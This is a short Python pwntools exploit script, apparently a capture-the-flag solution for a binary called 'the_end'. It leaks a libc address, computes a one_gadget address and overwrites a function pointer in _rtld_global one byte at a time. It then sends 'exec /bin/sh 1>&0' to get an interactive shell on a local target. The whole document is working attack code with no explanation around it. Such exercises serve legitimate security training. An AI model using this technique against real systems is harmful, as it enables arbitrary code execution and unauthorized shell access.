#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *
from time import sleep

context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
# context.terminal = ['tmux', 'splitw', '-v']

path = "./the_end"
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

#p = process(path, aslr=1)

p = remote("127.0.0.1", 10005)

# gdb.attach(p)
# pause()

p.recvuntil("here is a gift ")
leak = p.recvuntil(",", drop=True)
libc.address = int(leak, 16) - libc.symbols['sleep']
info("libc.address: " + hex(libc.address))

one_gadget = p64(libc.address + 0xf02a4)


# call   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 <_rtld_global+3848>
target = libc.address + 0x5f0f48

sleep(0.1)

for i in range(5):
    p.send(p64(target + i))
    sleep(0.1)
    p.send(one_gadget[i])

p.sendline("exec /bin/sh 1>&0")
p.interactive()